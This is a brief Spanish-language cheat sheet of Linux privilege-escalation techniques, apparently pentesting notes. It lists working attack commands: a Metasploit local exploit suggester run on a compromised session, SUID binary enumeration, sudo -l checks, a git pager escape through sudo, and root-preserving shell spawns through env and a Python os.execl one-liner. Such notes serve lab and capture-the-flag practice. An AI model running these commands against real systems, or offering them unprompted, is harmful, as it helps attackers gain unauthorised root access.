
Este escalamiento es únicamente para sistemas operativos Linux

# Metasploit

SI queremos conocer cual puede ser una posible escalada podemos utilizar el siguiente módulo:

```
use post/multi/recon/local_exploit_suggester

set session 1

run
```

Una vez corriendo te mostrará cuales son los posibles módulos de metasploit que pueden servir para poder escalar los privilegios.

-------
# SUID

Si queremos ver todos los SUID a los cuales tenemos permiso:

```
find / -perm -4000 2>/dev/null #Find all SUID binaries
```

Página para ver que se puede realizar con ello

https://gtfobins.github.io/

------

# Permisos

Realizar el siguiente comando

```
sudo -l
```

Si se encuentran permisos que se puedan aplicar con sudo aplicar la siguiente extensión al sudo (sudo -u USER): 

```
sudo -u admin git -p help config
```

------
## ENV

Para escalar privilegios sin Sudo:

```
./usr/bin/env /bin/sh -p
```

## Python

Para escalar privilegios sin sudo:

```
/usr/bin/python3.10 -c  'import os; os.execl("/bin/sh","sh","-p")'
```
